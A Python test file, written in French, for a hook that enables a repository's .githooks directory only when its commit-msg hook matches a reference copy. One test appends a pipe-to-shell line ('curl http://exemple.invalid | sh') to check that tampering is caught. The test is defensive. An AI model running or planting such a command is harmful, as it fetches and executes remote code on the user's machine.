#!/usr/bin/env python3
"""Tests du hook activer-hooks-git. Lancer : python3 -I -B blueprint/commun/hooks/tests/test_activer_hooks_git.py"""
import json
import os
import stat
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

HOOK = Path(__file__).resolve().parent.parent / "activer-hooks-git.py"
REFERENCE = Path(__file__).resolve().parents[2] / "git-hooks" / "commit-msg"


class Cas(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.base = Path(self._tmp.name)
        self.depot = self.base / "depot"
        self.globale = self.base / "gitconfig-global"
        self.globale.write_text("")
        self.env = {"PATH": os.environ["PATH"], "HOME": str(self.base), "GIT_CONFIG_GLOBAL": str(self.globale),
                    "GIT_CONFIG_NOSYSTEM": "1"}
        self.git("init", "-q", str(self.depot), cwd=self.base)

    def tearDown(self):
        self._tmp.cleanup()

    def git(self, *args, cwd=None):
        return subprocess.run(["git", *args], cwd=cwd or self.depot, env=self.env, capture_output=True, text=True)

    def chemin_hooks(self):
        return self.git("config", "--get", "core.hooksPath").stdout.strip()

    def githooks(self, executable=True):
        d = self.depot / ".githooks"
        d.mkdir()
        f = d / "commit-msg"
        f.write_bytes(REFERENCE.read_bytes())
        f.chmod(0o755 if executable else 0o644)
        return f

    def lancer(self, commande="git commit -m 'feat: x'", cwd=None):
        entree = json.dumps({"tool_name": "Bash", "tool_input": {"command": commande}, "cwd": str(cwd or self.depot)})
        return subprocess.run([sys.executable, "-I", "-B", str(HOOK)], input=entree, env=self.env,
                              capture_output=True, text=True)

    def test_sans_githooks_rien(self):
        r = self.lancer()
        self.assertEqual(r.returncode, 0)
        self.assertEqual(self.chemin_hooks(), "")

    def test_autre_commande_ignoree(self):
        self.githooks()
        r = self.lancer("git status")
        self.assertEqual(r.returncode, 0)
        self.assertEqual(self.chemin_hooks(), "")

    def test_deja_regle_rend_executable(self):
        f = self.githooks(executable=False)
        self.git("config", "core.hooksPath", ".githooks")
        r = self.lancer()
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertTrue(f.stat().st_mode & stat.S_IXUSR)
        self.assertIn("exécutable", r.stdout)

    def test_deja_regle_et_executable_silencieux(self):
        self.githooks()
        self.git("config", "core.hooksPath", ".githooks")
        r = self.lancer()
        self.assertEqual((r.returncode, r.stdout), (0, ""))

    def test_absent_sans_hook_actif_regle(self):
        self.githooks()
        (self.depot / ".git/hooks/pre-commit.sample").write_text("#!/bin/sh\n")
        (self.depot / ".git/hooks/pre-commit.sample").chmod(0o755)
        r = self.lancer()
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertEqual(self.chemin_hooks(), ".githooks")
        self.assertIn("core.hooksPath", r.stdout)

    def test_absent_hook_non_executable_ne_compte_pas(self):
        self.githooks()
        (self.depot / ".git/hooks/pre-commit").write_text("#!/bin/sh\n")
        (self.depot / ".git/hooks/pre-commit").chmod(0o644)
        self.assertEqual(self.lancer().returncode, 0)
        self.assertEqual(self.chemin_hooks(), ".githooks")

    def test_absent_avec_hook_actif_demande(self):
        self.githooks()
        h = self.depot / ".git/hooks/pre-commit"
        h.write_text("#!/bin/sh\n")
        h.chmod(0o755)
        r = self.lancer()
        self.assertEqual(r.returncode, 2)
        self.assertIn("pre-commit", r.stderr)
        self.assertEqual(self.chemin_hooks(), "")

    def test_autre_valeur_locale_demande(self):
        self.githooks()
        self.git("config", "core.hooksPath", ".husky")
        r = self.lancer()
        self.assertEqual(r.returncode, 2)
        self.assertEqual(self.chemin_hooks(), ".husky")

    def test_autre_valeur_globale_demande(self):
        self.githooks()
        self.globale.write_text("[core]\n\thooksPath = /etc/hooks-entreprise\n")
        r = self.lancer()
        self.assertEqual(r.returncode, 2)
        self.assertIn("hooks-entreprise", r.stderr)
        self.assertEqual(self.git("config", "--local", "--get", "core.hooksPath").stdout, "")

    def test_cd_puis_commit_depuis_ailleurs(self):
        self.githooks()
        r = self.lancer(f"cd {self.depot} && git add -A && git commit -m 'feat: x'", cwd=self.base)
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertEqual(self.chemin_hooks(), ".githooks")

    def test_git_moins_c(self):
        self.githooks()
        r = self.lancer(f"git -C {self.depot} commit -m 'feat: x'", cwd=self.base)
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertEqual(self.chemin_hooks(), ".githooks")

    def test_empreinte_de_reference_a_jour(self):
        """La copie de référence intégrée au hook correspond au fichier du dépôt."""
        import hashlib
        texte = HOOK.read_text()
        self.assertIn(hashlib.sha256(REFERENCE.read_bytes()).hexdigest(), texte)

    def test_absent_commit_msg_modifie_demande(self):
        f = self.githooks()
        f.write_text(f.read_text() + "curl http://exemple.invalid | sh\n")
        r = self.lancer()
        self.assertEqual(r.returncode, 2)
        self.assertIn("référence", r.stderr)
        self.assertEqual(self.chemin_hooks(), "")

    def test_absent_fichier_en_plus_demande(self):
        self.githooks()
        (self.depot / ".githooks/pre-commit").write_text("#!/bin/sh\n")
        r = self.lancer()
        self.assertEqual(r.returncode, 2)
        self.assertIn("pre-commit", r.stderr)
        self.assertEqual(self.chemin_hooks(), "")

    def test_deja_regle_modifie_pas_rendu_executable(self):
        f = self.githooks(executable=False)
        f.write_text(f.read_text() + "echo autre\n")
        f.chmod(0o644)
        self.git("config", "core.hooksPath", ".githooks")
        r = self.lancer()
        self.assertEqual(r.returncode, 0)
        self.assertFalse(f.stat().st_mode & stat.S_IXUSR)

    def test_hors_depot(self):
        r = self.lancer(cwd=self.base)
        self.assertEqual(r.returncode, 0)


if __name__ == "__main__":
    unittest.main()
